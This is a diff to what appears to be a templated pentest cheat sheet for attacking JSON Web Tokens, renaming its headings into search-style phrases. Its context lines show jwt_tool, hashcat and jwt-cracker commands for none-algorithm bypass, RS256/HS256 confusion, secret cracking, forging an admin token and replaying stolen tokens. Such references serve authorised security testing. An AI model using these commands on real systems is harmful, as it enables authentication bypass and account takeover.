@@ -6,7 +6,7 @@
 
 ---
 
-## None Algorithm Attack
+## bypass jwt none alg
 Strip signature and force `alg: none` to bypass signature verification.
 
 ```bash
@@ -17,7 +17,7 @@ python3 jwt_tool.py {{JWT:str}} -I -A none -S
 
 ---
 
-## Algorithm Confusion (RS256 to HS256)
+## bypass jwt alg confusion rs256 hs256
 Switch RS256 to HS256 and sign with the public key as the HMAC secret.
 
 ```bash
@@ -28,7 +28,7 @@ python3 jwt_tool.py {{JWT:str}} -I -A HS256 --pubkey {{PUBKEY:file:public.pem}} 
 
 ---
 
-## Brute Force HMAC Secret with Hashcat
+## crack jwt hmac secret hashcat
 Hashcat mode 16500 cracks JWT-HS256 weak secrets.
 
 ```bash
@@ -39,7 +39,7 @@ hashcat -a 0 -m 16500 {{JWT:str}} {{WORDLIST:wordlist:/usr/share/wordlists/rocky
 
 ---
 
-## jwt-cracker Wordlist Attack
+## crack jwt secret wordlist
 Try secrets from a wordlist against a JWT.
 
 ```bash
@@ -50,7 +50,7 @@ jwt-cracker {{JWT:str}} -w {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}
 
 ---
 
-## Inspect JWT Claims
+## decode jwt claims
 Decode header and payload claims for inspection.
 
 ```bash
@@ -61,7 +61,7 @@ python3 jwt_tool.py {{JWT:str}} -pc
 
 ---
 
-## Sign Forged Token with Secret
+## forge jwt sign secret
 Generate a forged JWT once secret is known (e.g., from staging).
 
 ```bash
@@ -72,7 +72,7 @@ python3 jwt_tool.py --sign -A HS256 --key '{{SECRET:str}}' -C '{"role":"admin"}'
 
 ---
 
-## Replay Stolen Token
+## replay jwt bearer header
 Send a captured JWT in the Authorization header.
 
 ```bash
@@ -83,7 +83,7 @@ curl -H "Authorization: Bearer {{JWT:str}}" {{URL:url}}
 
 ---
 
-## Multi-Source Token Override
+## bypass jwt multi source override
 Send malicious token in query while a victim token is in the header.
 
 ```bash
